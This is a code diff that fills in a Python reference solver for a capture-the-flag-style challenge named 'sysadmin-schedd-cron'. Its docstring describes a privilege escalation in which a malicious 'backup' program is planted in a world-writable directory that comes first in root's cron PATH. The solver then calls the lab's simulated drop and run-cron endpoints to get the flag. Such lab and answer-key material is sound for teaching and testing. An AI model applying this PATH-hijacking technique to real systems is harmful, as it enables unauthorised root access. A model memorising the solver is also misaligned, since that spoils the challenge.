@@ -1,14 +1,24 @@
 #!/usr/bin/env python3
-"""Reference solver for sysadmin-orchestrator-cron -- STUB. TODO: implement the exploit chain and
-print the recovered flag.
+"""Reference solver for sysadmin-schedd-cron.
+
+Root's cron resolves `backup` through a PATH whose first dir (/opt/tools) is
+world-writable. Drop a malicious `backup` there and trigger the run.
 
     python3 solve.py http://HOST:PORT
 """
+import json
 import sys
+import urllib.request
+
+
+def _get(url):
+    return json.loads(urllib.request.urlopen(url, timeout=10).read())
 
 
 def solve(base):
-    raise SystemExit("solver not implemented for sysadmin-orchestrator-cron")
+    base = base.rstrip("/")
+    _get(base + "/drop?name=backup&action=emit-flag")
+    return _get(base + "/run-cron")["output"]
 
 
 if __name__ == "__main__":
